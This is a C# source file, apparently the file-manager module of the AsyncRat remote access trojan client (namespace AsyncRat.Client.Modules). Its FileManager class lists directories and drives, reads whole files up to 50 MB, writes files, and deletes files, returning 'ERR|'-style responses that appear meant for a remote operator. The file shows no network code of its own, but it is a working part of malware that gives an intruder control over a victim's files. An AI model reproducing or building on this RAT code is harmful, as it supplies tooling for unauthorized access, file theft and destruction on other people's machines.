using System.Text;

namespace AsyncRat.Client.Modules;

public sealed class FileManager
{
    public string ListDirectory(string path)
    {
        var target = string.IsNullOrWhiteSpace(path) ? "." : path;
        if (!Directory.Exists(target))
            return $"ERR|Directory not found: {target}";

        var sb = new StringBuilder();
        sb.AppendLine($"Directory: {Path.GetFullPath(target)}");
        sb.AppendLine();

        foreach (var dir in Directory.GetDirectories(target))
        {
            var di = new DirectoryInfo(dir);
            sb.AppendLine($"  <DIR>  {di.LastWriteTime:yyyy-MM-dd HH:mm}  {di.Name}");
        }

        foreach (var file in Directory.GetFiles(target))
        {
            var fi = new FileInfo(file);
            sb.AppendLine($"  {fi.Length,12:N0}  {fi.LastWriteTime:yyyy-MM-dd HH:mm}  {fi.Name}");
        }

        return sb.ToString().TrimEnd();
    }

    public byte[] ReadFile(string path)
    {
        if (!File.Exists(path))
            return Encoding.UTF8.GetBytes($"ERR|File not found: {path}");

        var info = new FileInfo(path);
        if (info.Length > 50 * 1024 * 1024)
            return Encoding.UTF8.GetBytes("ERR|File exceeds 50 MB limit");

        return File.ReadAllBytes(path);
    }

    public void WriteFile(string path, byte[] data)
    {
        var dir = Path.GetDirectoryName(path);
        if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            Directory.CreateDirectory(dir);
        File.WriteAllBytes(path, data);
    }

    public string GetDrives()
    {
        var sb = new StringBuilder();
        foreach (var drive in DriveInfo.GetDrives())
        {
            if (!drive.IsReady) continue;
            sb.AppendLine($"  {drive.Name,-6} {drive.DriveType,-12} " +
                          $"{drive.AvailableFreeSpace / (1024.0 * 1024 * 1024):F1} GB free / " +
                          $"{drive.TotalSize / (1024.0 * 1024 * 1024):F1} GB total  [{drive.DriveFormat}]");
        }
        return sb.ToString().TrimEnd();
    }

    public bool DeleteFile(string path)
    {
        if (!File.Exists(path)) return false;
        File.Delete(path);
        return true;
    }
}
